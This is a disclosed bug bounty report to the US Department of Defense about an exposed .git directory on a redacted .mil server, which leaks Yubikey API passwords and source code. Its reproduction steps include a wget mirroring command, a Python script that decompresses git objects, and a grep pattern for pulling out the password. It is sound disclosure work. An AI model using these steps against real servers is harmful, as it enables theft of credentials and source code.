# Git repo on https://██████.mil/ discloses API password

## Report Details
- **Report ID**: 765825
- **URL**: https://hackerone.com/reports/765825
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-12-29T16:49:49.871Z
- **Disclosed**: 2021-03-24T20:49:00.187Z

## Reporter
- **Username**: al-madjus
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
I found a .git repository on https://███████.mil/.git which discloses an API password for Yubikey on 2 different domains, together with full source code. 

**Description:**
Fetching the git repository and decompressing the objects results in the ability to read the source code of the server, which includes an API password for the Yubikey hardware authentication software. The API however does not appear to be functional on the main domain, but since the repository is very recent, I cannot be certain that it'll stay non-functional. 
Additionally, the server discloses info.php at https://███████.mil/info.php. I'm uncertain if this should be reported separately, any comments on this would be very welcome! 

## Impact
I'm rating the impact of this primarily as an information disclosure. The repository appears to have been active within the past months, so any future additions will be disclosed too. 
I was unable to use the found password as the API appears to be currently non-functional, but since the repo is active I would expect the server to be worked upon, and the API to be functional in the future. For this reason I've decided to make you aware of the issue. 
Also, even if the password were to be changed, it would of course still be disclosed on the repository. 
Furthermore, the repository discloses the full source code of the served pages. 

## Step-by-step Reproduction Instructions

1. Fetch the repo with wget:

`wget --no-parent -r https://█████.mil/.git/ --no-check-certificate`
2. Write the following python script (remember to update the 'pwd' variable): 

`import zlib
import os
pwd = INSERT FULL PATH WHERE THE REPO WAS DOWNLOADED + '█████████.mil/.git/objects/'
for subdir, dirs, files in os.walk(pwd):
    for file in files:
        if not file.startswith("index"):
            filename = subdir + '/' +  file
            compressed_contents = open(filename, 'rb').read()
            decompressed_contents = zlib.decompress(compressed_contents)
            print(str(decompressed_contents) + '\n')`

The script is also attached as a file. 
3. Run the script with 

`python gitreader.py | grep -i -E -o ".{0,138}restPW.{0,22}"`

Which greps the output for the string where the password is, together with the paths/domains. 
Of course, the full contents of the repository are available to look through. 

Example output: 
`'https://███`

## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions
Remove the .git repository from the server, since it contains sensitive information.

## Impact

I'm rating the impact of this primarily as an information disclosure. The repository appears to have been active within the past months, so any future additions will be disclosed too. 
I was unable to use the found password as the API appears to be currently non-functional, but since the repo is active I would expect the server to be worked upon, and the API to be functional in the future. For this reason I've decided to make you aware of the issue. 
Also, even if the password were to be changed, it would of course still be disclosed on the repository. 
Furthermore, the repository discloses the full source code of the served pages.

## Attachments
No attachments
